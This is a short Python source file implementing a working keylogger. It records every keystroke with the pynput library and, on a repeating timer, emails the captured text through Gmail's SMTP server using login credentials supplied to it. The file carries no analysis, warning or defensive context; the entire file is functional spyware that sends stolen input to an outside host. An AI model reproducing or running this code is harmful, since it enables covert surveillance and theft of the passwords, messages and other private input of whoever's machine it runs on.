from pynput import keyboard
import threading
import smtplib

class Keylogger:
	def __init__(self, time_interval, email, password):
		self.logger = "Keylogger started"
		self.interval = time_interval
		self.email = email
		self.password = password

	def append_logger(self, string):
		self.logger = self.logger + string

	def key_pressed(self, key):
		try:
			curr_key = str(key.char)
		except AttributeError:
			if key == key.space:
				curr_key = " "
			elif key == key.enter:
				curr_key = "\n"
			else:
				curr_key =  " " + str(key) + " "
		self.append_logger(curr_key)

	def mail(self):
		self.send_mail(self.email, self.password, "\n\n" + self.logger)
		self.logger = ""
		timer = threading.Timer(self.interval, self.mail)
		timer.start()

	def send_mail(self, email, password, message):
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, message)
		server.quit()

	def run(self):
		with keyboard.Listener(on_press=self.key_pressed) as listener:
			self.mail()
			listener.join()
